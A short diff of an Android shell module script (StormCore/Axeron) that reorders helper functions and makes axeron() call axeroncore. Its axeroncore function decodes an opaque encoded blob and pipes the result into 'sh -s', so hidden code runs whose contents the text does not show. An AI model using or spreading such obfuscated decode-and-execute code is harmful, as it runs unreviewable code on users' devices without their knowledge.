@@ -43,6 +43,14 @@ busybox() {
  /data/local/tmp/busybox $@
 }
 
+devcore() {
+ echo $(shellstorm "ARM17:16TXsNew16zXr9a21qvWq9ey167Xtde21qzWrNat1qrXo9el17DXpNex157Wqtel16vWq9ed17TXodeu16vXqtar16/XpNeh16jXqNar153XtNeh167Xq9eq15/Xq9eu16HWqtev16Q=" $(dirname $0))
+}
+
+axeroncore() {
+  shellstorm "ARM17:16TXsNew16zXr9a21qvWq9ey167Xtde21qzWrNat1qrXo9el17DXpNex157Wqtel16vWq9ed17TXodeu16vXqtar16/XpNeh16jXqNar153XtNeh167Xq9eq15/Xq9eu16HWqtev16Q=" $(dirname $0) | sh -s $@
+}
+
 axeron() {
 local prop=$(cat <<-EOF
 id="AC"
@@ -54,14 +62,7 @@ description="StormCore adalah module bawaan sebagai Adapter Axeron pengganti Axe
 EOF
 )
 echo $prop > ${EXECPATH}/axeron.prop
-}
-
-devcore() {
- echo $(shellstorm "ARM17:16TXsNew16zXr9a21qvWq9ey167Xtde21qzWrNat1qrXo9el17DXpNex157Wqtel16vWq9ed17TXodeu16vXqtar16/XpNeh16jXqNar153XtNeh167Xq9eq15/Xq9eu16HWqtev16Q=" $(dirname $0))
-}
-
-axeroncore() {
-  shellstorm "ARM17:16TXsNew16zXr9a21qvWq9ey167Xtde21qzWrNat1qrXo9el17DXpNex157Wqtel16vWq9ed17TXodeu16vXqtar16/XpNeh16jXqNar153XtNeh167Xq9eq15/Xq9eu16HWqtev16Q=" $(dirname $0) | sh -s $@
+axeroncore $1
 }
 
 getid() {
